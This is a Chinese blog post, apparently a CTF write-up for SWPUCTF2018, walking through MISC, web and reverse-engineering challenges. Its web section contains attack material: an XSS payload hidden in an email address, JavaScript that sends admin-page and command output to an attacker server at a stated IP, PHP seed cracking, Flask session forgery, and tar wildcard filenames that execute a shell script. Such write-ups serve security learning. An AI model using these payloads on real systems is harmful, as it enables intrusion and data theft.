@@ -1,0 +1,731 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head><meta name="generator" content="Hexo 3.8.0">
+	<title>SWPUCTF2018-WEB&amp;MISC WriteUp</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="miraitowa">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class="page-name">当前文章&nbsp;:&nbsp;《SWPUCTF2018-WEB&amp;MISC WriteUp》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		12/20/2018 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="友链">友链</a>	
+      		</li>
+    		
+    		
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2018/12/20/SWPUCTF2018-WEB&MISC Write Up/" itemprop="url">		
+			SWPUCTF2018-WEB&amp;MISC WriteUp		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2018/12/20/SWPUCTF2018-WEB&MISC Write Up/" itemprop="url">
+	<time datetime="2018-12-20T14:58:19.868Z" itemprop="datePublished">
+  		2018-12-20
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SWPUCTF2018的题目挺好的，尤其是MISC完全是面向萌新的(HHHHH)</p>
+<p>web感觉好难呀，今天下午才知道有这个比赛的，七点开始做题。。。。。</p>
+<p>AK了MISC，不值得一提，web在大佬的指点下拿下三道flag</p>
+<p>REVERSE干了好久，才把第二题做出来(QAQ)，还是自己太菜了(QAQ)</p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><p>挺简单的一道签到题，更改一下高度就可以了，你先ctrl-f查找flag在winhex中，发现只有</p>
+<p><img src="https://i.imgur.com/LAYJj6a.png" alt=""></p>
+<p>更改高度就会得到：</p>
+<p><img src="https://i.imgur.com/4ei1vQd.png" alt=""></p>
+<p>就会得到</p>
+<p><img src="https://i.imgur.com/woftBJZ.png" alt=""></p>
+<p>很容易拿到flag：<code>flag{b2b85ec7ec8cc4771b8d055aee5f82b0}</code></p>
+<h4 id="唯有低头-才能出头"><a href="#唯有低头-才能出头" class="headerlink" title="唯有低头,才能出头"></a>唯有低头,才能出头</h4><p>下载得到的内容:</p>
+<pre><code>99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33
+</code></pre><p>根据题目的意思很明显是一个键盘密码呀，数字的重复次数代表第几行。99代表9下面第二行的L，9代表9下面第一行的o，以此类推</p>
+<p>成功那到flag：<code>swpuctf{lookatthekeyboard}</code></p>
+<h4 id="流量签到"><a href="#流量签到" class="headerlink" title="流量签到"></a>流量签到</h4><p>这一题流量题好简单呀，放进Wireshark就可以查看到flag了</p>
+<p><img src="https://i.imgur.com/G4Vr7Ky.png" alt=""></p>
+<p>成功拿到flag:<code>SWPUCTF{Th1s_i3_e4sy_pc@p}</code></p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码 买个 X ?"></a>用优惠码 买个 X ?</h4><p>注册登录之后hi有优惠码：<code>dNC5AEzk75eWFRT</code></p>
+<p><img src="https://i.imgur.com/FWmQqDE.png" alt=""></p>
+<p>输入优惠码购买会提示：此优惠码已失效! 请重新输入24位长的优惠码,由此来完成您的购买！扫目录扫到<code>www.zip</code>，很明显的文件泄露问题</p>
+<pre><code>&lt;?php
+//生成优惠码
+$_SESSION[&#39;seed&#39;]=rand(0,999999999);
+function youhuima(){
+  mt_srand($_SESSION[&#39;seed&#39;]);
+$str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+$auth=&#39;&#39;;
+$len=15;
+for ( $i = 0; $i &lt; $len; $i++ ){
+if($i&lt;=($len/2))
+  $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
+else
+  $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
+}
+setcookie(&#39;Auth&#39;, $auth);
+}
+//support
+  if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){
+if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){
+   //执行命令
+}else {
+  //flag字段和某些字符被过滤!
+}
+  }else{
+ // 你的输入不正确!
+  }
+?&gt;
+</code></pre><p><code>mt_srand()</code>函数的随机数种子由<code>rand(0,999999999)</code>生成。然后用<code>mt_rand(0,61)</code>生成随机数来随机截取字符串<code>$str_rand</code>中的一个</p>
+<p>字符。因此我们只要得到mt_srand()函数的播种种子的值，就可以预测出24位的优惠码。</p>
+<p>这里可以参考<code>wonderkun</code>师傅的文章：<a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">php的随机数的安全性分析</a></p>
+<p>我们可以根据最终得到的字符串来反推出<code>mt_rand()</code>函数生成的15个随机数值，然后爆破出种子即可。</p>
+<p>这里用到了爆破种子的c语言程序<code>php_mt_seed</code>：<a href="http://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">http://www.openwall.com/php_mt_seed/</a></p>
+<p>然后用<code>wonderkun</code>师傅的脚本得到15个随机数并整理成该爆破程序所需要的格式</p>
+<p>因为我用15个爆破不出来，这里我只生成了前面的一部分随机数，不过并不会影响结果。</p>
+<pre><code>&lt;?php
+$str = &quot;z9uDXeHLCJ7LqRq&quot;;
+$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+$len=15;
+for($i=0;$i&lt;$len;$i++){
+if($i&lt;=($len/2))
+{
+$pos = strpos($randStr,$str[$i]);
+echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;
+}
+
+   //整理成方便 php_mt_seed 测试的格式
+  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]
+}
+echo &quot;\n&quot;;
+?&gt;
+</code></pre><p>生成的值：</p>
+<pre><code>25 25 0 61 35 35 0 61 20 20 0 61 39 39 0 61 59 59 0 61 4 4 0 61 43 43 0 61 47 47 0 61
+</code></pre><p>用<code>php_mt_seed</code>爆破出来一个种子</p>
+<p><img src="https://i.imgur.com/VH1aFxt.png" alt=""></p>
+<p>然后把源码改成生成24位的</p>
+<pre><code>&lt;?php
+//生成优惠码
+function youhuima(){
+mt_srand(104038799);
+$str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+$auth=&#39;&#39;;
+$len=24;
+for ( $i = 0; $i &lt; $len; $i++ ){
+if($i&lt;=($len/2))
+  $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
+else
+  $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
+}
+echo $auth;
+}
+youhuima();
+</code></pre><p>这里注意，通过题目的响应包我发现题目环境为7.2的，所以这里需要用php7运行这段代码，生成24位优惠码。</p>
+<p><img src="https://i.imgur.com/CrAbbpD.png" alt=""></p>
+<p>接下来就是RCE绕过，利用%0a绕过$。</p>
+<p><img src="https://i.imgur.com/90kfcaW.png" alt=""></p>
+<h4 id="皇家线上赌场"><a href="#皇家线上赌场" class="headerlink" title="皇家线上赌场"></a>皇家线上赌场</h4><p>点击链接就可以看到</p>
+<p><img src="https://i.imgur.com/qpuZRO1.png" alt=""></p>
+<p>登陆查看源码可以看到提示<code>&lt;!-- /source --&gt;</code>以及<code>/static?file=test.js</code>弹出的<code>xss</code>，访问一下<code>source</code>可以看到一个目录树和<br><code>views.py</code>中的任意文件读取。</p>
+<p><img src="https://i.imgur.com/4vM6DTT.png" alt=""></p>
+<p>但是被限制了，所以，我们需要通过使用绝对路径进行读取源码</p>
+<p><img src="https://i.imgur.com/rzJLZsO.png" alt=""></p>
+<p>通过读取<code>/proc/self/mounts</code>可以看到一个<code>/home/ctf/web_assli3fasdf</code>路径，但是里面读取不到<code>views.py</code>的内容</p>
+<p><img src="https://i.imgur.com/LAVbn7s.png" alt=""></p>
+<p>我们可以使用<code>/proc/self/cwd/app/views.py</code>可以读到源码</p>
+<p><img src="https://i.imgur.com/whVX91t.png" alt=""></p>
+<pre><code>def register_views(app):
+@app.before_request
+def reset_account():
+    if request.path == &#39;/signup&#39; or request.path == &#39;/login&#39;:
+        return
+    uname = username=session.get(&#39;username&#39;)
+    u = User.query.filter_by(username=uname).first()
+    if u:
+        g.u = u
+        g.flag = &#39;swpuctf{xxxxxxxxxxxxxx}&#39;
+        if uname == &#39;admin&#39;:
+            return
+        now = int(time())
+        if (now - u.ts &gt;= 600):
+            u.balance = 10000
+            u.count = 0
+            u.ts = now
+            u.save()
+            session[&#39;balance&#39;] = 10000
+            session[&#39;count&#39;] = 0
+
+@app.route(&#39;/getflag&#39;, methods=(&#39;POST&#39;,))
+@login_required
+def getflag():
+    u = getattr(g, &#39;u&#39;)
+    if not u or u.balance &lt; 1000000:
+        return &#39;{&quot;s&quot;: -1, &quot;msg&quot;: &quot;error&quot;}&#39;
+    field = request.form.get(&#39;field&#39;, &#39;username&#39;)
+    mhash = hashlib.sha256((&#39;swpu++{0.&#39; + field + &#39;}&#39;).encode(&#39;utf-8&#39;)).hexdigest()
+    jdata = &#39;{{"{0}":' + '"{1.' + field + '}", "hash": "{2}"}}&#39;
+    return jdata.format(field, g.u, mhash)
+</code></pre><p>还有一个<code>__init__.py</code></p>
+<pre><code>from flask import Flask
+from flask_sqlalchemy import SQLAlchemy
+from .views import register_views
+from .models import db
+
+
+def create_app():
+app = Flask(__name__, static_folder=&#39;&#39;)
+app.secret_key = &#39;9f516783b42730b7888008dd5c15fe66&#39;
+app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] = &#39;sqlite:////tmp/test.db&#39;
+register_views(app)
+db.init_app(app)
+return app
+</code></pre><p>可以看到给了<code>secret_key</code>，可以用来伪造<code>session</code>。解密题目<code>session</code></p>
+<p><img src="https://i.imgur.com/kugBT9c.png" alt=""></p>
+<p>本地搭建环境使用secret_key伪造session，并把用户名改为admin来跳过balance的重置，访问getflag路由。</p>
+<p><img src="https://i.imgur.com/OsmtdX0.png" alt=""></p>
+<p>然后使用User的save方法跳出g.u获取flag。</p>
+<p><img src="https://i.imgur.com/8EK1ciX.png" alt=""></p>
+<h4 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h4><p>这一题很有趣(HHHH),毕竟花了那么多的时间</p>
+<p>首先打开题目，发现功能只有两个，一个是验证邮箱，另一个是管理后台，但是管理后台需要本地，那突破点就在邮箱验证了。</p>
+<p><img src="https://i.imgur.com/okU6yu1.png" alt=""></p>
+<p>查看源代码发现：check.php部分代码</p>
+<pre><code>&lt;!--check.php
+if($_POST[&#39;email&#39;]) {
+$email = $_POST[&#39;email&#39;];
+if(!filter_var($email,FILTER_VALIDATE_EMAIL)){
+echo &quot;error email, please check your email&quot;;
+}else{
+echo &quot;等待管理员自动审核&quot;;
+echo $email;
+}
+}
+?&gt;
+</code></pre><p>可以看到利用了FILTER_VALIDATE_EMAIL过滤器来过滤注册的邮箱，是不安全的。</p>
+<p>可以参考p神师傅的文章：<a href="https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html" target="_blank" rel="noopener">攻击LNMP架构Web应用的几个小Tricks</a>邮箱地址分为local part和domain part两部分，</p>
+<p><code>local part</code>中可以利用双引号来包含特殊字符。如<code>&quot;&lt;svg/onload=alert(1)&gt;&quot;@example.com</code>是合法的</p>
+<p>所以我们可以构造<code>&quot;&lt;scRipt/src=http://yourvps/123.js&gt;&lt;/scriPt&gt;&quot;@qq.com</code>进行<code>xss</code>。但是发现打到的<code>cookie</code>为空，所以只能利用<code>ajax</code>来读取后台页面。</p>
+<pre><code>xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+{
+document.location=&#39;http://yourvps/?&#39;+btoa(xmlhttp.responseText);
+}
+}
+xmlhttp.open(&quot;POST&quot;,&quot;admin.php&quot;,true);
+xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+xmlhttp.send();
+</code></pre><p>在自己的vps上监听端口，即可收到请求。</p>
+<p>可以发现<code>admin.php</code>中有一个<code>admin/a0a.php?cmd=whoami</code>，明显的命令执行。但是一直弹不回来<code>shell</code>，不知道为什么，只好用<code>ajax</code>把命令执行的结果反弹回来。</p>
+<p><img src="https://i.imgur.com/PaPU6Xp.png" alt=""></p>
+<p>构造</p>
+<pre><code>xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+{
+document.location=&#39;http://47.106.142.99:8012/?&#39;+btoa(xmlhttp.responseText);
+}
+}
+xmlhttp.open(&quot;POST&quot;,&quot;a0a.php?cmd=ls /&quot;,true);
+xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+xmlhttp.send();
+</code></pre><p><img src="https://i.imgur.com/mAnse4H.png" alt=""></p>
+<p>但是读取<code>flag</code>会发现返回为空，执行<code>ls -al /</code>发现<code>flag</code>文件属于<code>flag</code>用户，且其他用户无法读取。</p>
+<p><img src="https://i.imgur.com/4r7WpXk.png" alt=""></p>
+<p>通过ls我们发现了一个MD5名字的目录，<code>ls</code>一下发现有<code>upload.php</code>，并且属于flag用户。</p>
+<p><img src="https://i.imgur.com/zc48WyH.png" alt=""></p>
+<p>访问页面，给了一个上传功能，一个备份功能。发现可以任意文件上传，上传php但是不可访问。备份点开可以发现是使用tar命令就行备份。</p>
+<p><img src="https://i.imgur.com/uNI1hcX.png" alt=""></p>
+<p>这里可以利用tar命令进行提权。参考：<a href="https://www.freebuf.com/articles/system/176255.html" target="_blank" rel="noopener">利用通配符进行Linux本地提权</a></p>
+<p>其实就是把文件名当作命令参数给执行了。</p>
+<p>将反弹<code>shell</code>的命令写入<code>shell.sh</code>，并上传。再接着上传两个文件<code>--checkpoint-action=exec=sh shell.sh</code>和<code>--checkpoint=1</code>，</p>
+<p>然后点击备份即可反弹<code>shell</code>，其中<code>shell.sh</code>内容为<code>cat /flag|base64</code>，即可得到flag</p>
+<p><img src="https://i.imgur.com/ugXSRa4.png" alt=""></p>
+<p><img src="https://i.imgur.com/vwk42xi.png" alt=""></p>
+<h3 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h3><h4 id="RE2"><a href="#RE2" class="headerlink" title="RE2"></a>RE2</h4><p>根据题目提示用<code>x32dbg</code>动态调试发现和<code>SEH，VEH</code>有关。</p>
+<p><img src="https://i.imgur.com/eHAU1ta.png" alt=""></p>
+<p>处理函数在<code>sub_401600</code>中，对输入进行循环左移和异或，动态调试时发现会在输入后加上”cyy”,然后主两部分处理都是对dword值进行操作，写脚本要注意处理。</p>
+<p><img src="https://i.imgur.com/H41JM1e.png" alt=""></p>
+<p>然后时handler函数。</p>
+<p><img src="https://i.imgur.com/u7SH4R4.png" alt=""></p>
+<p>进行base64加密，需要注意的编码表是变化了的。</p>
+<p><img src="https://i.imgur.com/R4qVSsD.png" alt=""></p>
+<p>最后和“<code>LMlWu2Y/Tk8c33Y+T8Lv0a==</code>“对比。</p>
+<p>先写base64解密脚本。</p>
+<pre><code>from string import maketrans
+
+base = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;
+diy_base = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/&#39;
+
+t = maketrans(base, diy_base)
+t2 = maketrans(diy_base, base)
+
+def cus_base64_enc(x):
+return x.encode(&#39;base64&#39;).translate(t)
+def cus_base64_dec(x):
+return x.translate(t2).decode(&#39;base64&#39;)
+
+str = cus_base64_dec(&#39;LMlWu2Y/Tk8c33Y+T8Lv0a==&#39;)
+for i in str:
+print(&quot;0x%x,&quot;%ord(i)),
+</code></pre><p>得到<code>0x96, 0x62, 0xf0, 0x53, 0x6c, 0xbf, 0xb4, 0xaf, 0x2, 0xdf, 0x7c, 0xbe, 0xb7, 0xc9, 0x55, 0xd0。</code></p>
+<p>四个一组我们可以写出四个<code>dword</code>值，<code>arr1=0x53f06296，arr2=0xafb4bf6c，arr3=0xbe7cdf02，arr4=0xd055c9b7</code>。然后恢复一下四个</p>
+<p>dword值的顺序，得到<code>arr1=0xd055c9b7，arr2=0xbe7cdf02，arr3=0x53f06296，arr4=0xafb4bf6c。</code>其中“cyy”的dword值为<code>0x797963，为arr5=0x797963。</code></p>
+<p>然后我们写出循环左移异或的逆向脚本即可。</p>
+<pre><code>arr1 = 0xd055c9b7
+arr2 = 0xbe7cdf02
+arr3 = 0x53f06296
+arr4 = 0xafb4bf6c
+arr5 = 0x797963
+
+arr4 = arr4 ^ arr5
+arr4 = ((arr4&lt;&lt;27)|(arr4&gt;&gt;5))&amp;0xffffffff
+arr3 = arr3 ^ arr4
+arr3 = ((arr3&lt;&lt;27)|(arr3&gt;&gt;5))&amp;0xffffffff
+arr2 = arr2 ^ arr3
+arr2 = ((arr2&lt;&lt;27)|(arr2&gt;&gt;5))&amp;0xffffffff
+arr1 = arr1 ^ arr2
+arr1 = ((arr1&lt;&lt;27)|(arr1&gt;&gt;5))&amp;0xffffffff
+
+flag = &#39;&#39;
+arr = [arr1,arr2,arr3,arr4]
+for i in arr:
+a = hex(i)[2:-1].decode(&#39;hex&#39;)
+flag += a[::-1]
+print flag
+</code></pre><p>运行即可得到flag</p>
+<p><img src="https://i.imgur.com/AKwMR36.png" alt=""></p>
+
+					
+				</div>
+			</div>
+		</article>
+
+		<ul class="am-pagination">
+    
+	
+		<li class="am-pagination-next">
+		<a class="pull-right" href="/2018/12/20/数据结构——栈和队列学习篇(一)/" title="数据结构——栈和队列学习篇(一)">
+			下一篇 &raquo;
+		</a>
+		</li>
+	 
+ </ul>
+        
+
+		<div class="theme-annie-comment-button-container">
+	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
+		加载评论
+		<!--加载评论-->
+	</button>
+</div>
+
+<div id="annie-comment-container" class="theme-annie-comment-main-container">
+
+	
+		
+			<!-- comment gitalk -->
+			<!-- show gitalk comment -->
+
+  <div id="gitalk-container"></div>
+
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+	//thanks O-R
+	//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+	//去除尾部匹配正则数组的字符串  
+	//remove redundant characters
+	String.prototype.trimEnd = function(regStr) {
+		var result = this;
+		if(regStr == undefined || regStr == null || regStr == "") {
+			return result;
+		}
+		var array = regStr.split(',');
+
+		if(array.length > 0) {
+
+			var c = array.shift();
+			var str = this;
+			var i = str.length;
+			var rg = new RegExp(c);
+			var matchArr = str.match(rg);
+
+			if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+				var matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+					.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+					.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+					.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+					.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+					.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+					.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+					.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+				matchStr = matchStr + '$';
+				result = str.replace(new RegExp(matchStr), "");
+			}
+
+			if(array.length > 0) {
+				return result.trimEnd(array.join())
+			} else {
+				return result;
+			}
+		}
+	};
+
+	//create gitalk
+	var gitalk = new Gitalk({
+		clientID: '74a83cc9b15a1cf53e10',
+		clientSecret: 'b62af8b132c33178adcb0098e2315806e2e57cae',
+		//id: window.location.pathname,
+		// id: (window.location.pathname).split("/").pop().substring(0, 49),
+		id: md5(location.href.trimEnd('#.*$,\\?.*$,index.html$')),
+		repo: 'Annie-Gitalk',
+		owner: 'miraitowa',
+		admin: 'miraitowa',
+		distractionFreeMode: 'true',
+	})
+	gitalk.render('gitalk-container');
+</script>
+		
+	
+
+</div>
+
+<script type="text/javascript">
+	/* Show Comment */
+	var Annie_Comment = function() {
+		function Show_Hidden(obj) {
+			obj.style.display = 'block';
+		}
+		
+		//var obutton = $('#annie-comment-button');
+		//var obutton = $('#annie-comment-container');
+		var obutton = document.getElementById("annie-comment-button" || "0");
+		var odiv = document.getElementById("annie-comment-container");
+		if( 'obutton' ) {
+			obutton.onclick = function() {
+				Show_Hidden(odiv);
+				$("#annie-comment-button").css("display", 'none');
+				return false;
+			}
+		}
+	};
+
+	(function Annie_Init() {
+		Annie_Comment();
+	})();
+</script>
+		
+		<!--
+	时间：2018-09-24
+	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
+-->
+
+	
+		<aside class="post-widget">
+			<nav class="post-toc-wrap" id="post-toc">
+				
+					<strong>文章目录</strong>
+				
+				
+				<!--toc(post.content)-->
+				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-text">前言</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#MISC"><span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#签到题"><span class="post-toc-text">签到题</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#唯有低头-才能出头"><span class="post-toc-text">唯有低头,才能出头</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#流量签到"><span class="post-toc-text">流量签到</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#WEB"><span class="post-toc-text">WEB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#用优惠码-买个-X"><span class="post-toc-text">用优惠码 买个 X ?</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#皇家线上赌场"><span class="post-toc-text">皇家线上赌场</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#有趣的邮箱注册"><span class="post-toc-text">有趣的邮箱注册</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#REVERSE"><span class="post-toc-text">REVERSE</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#RE2"><span class="post-toc-text">RE2</span></a></li></ol></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</div></div></aside>
+	
+
+	</div>
+</div>
+		</div>
+		</main>
+		
+		<!--footer-->
+		<footer>
+	<div class="blog-text-center">
+		<div class="theme-annie-social">
+				
+				
+					<a href="https://github.com/miraitowa" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
+					
+				
+				
+					<a href="https://miraitowa.github.io/about/" title="Email" target="_blank"><i class="fa fa-envelope-o"></i>&nbsp;</a>
+					
+					
+						
+				
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			
+				&copy; 2018, content by miraitowa. All Rights Reserved. 			   
+			
+		</div>
+	</div>
+
+	<div class="blog-text-center">
+		<div class="theme-annie-copyright">
+			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
+		</div>
+	</div>
+</footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
+
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
+
+<style>
+	.motto {
+		color: #000000;
+		font-size: 20px;
+		margin: 100px 25% 0;
+		width: 50%;
+		line-height: 1.4;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
+		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
+	}
+</style>
+
+
+	<script src="/js/motto.js"></script>
+	<script type="text/javascript">
+		$(".motto").html(getMingYanContent());
+	</script>	
+
+
+
+
+
+
+
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
+
+	</body>
+	</html>
+
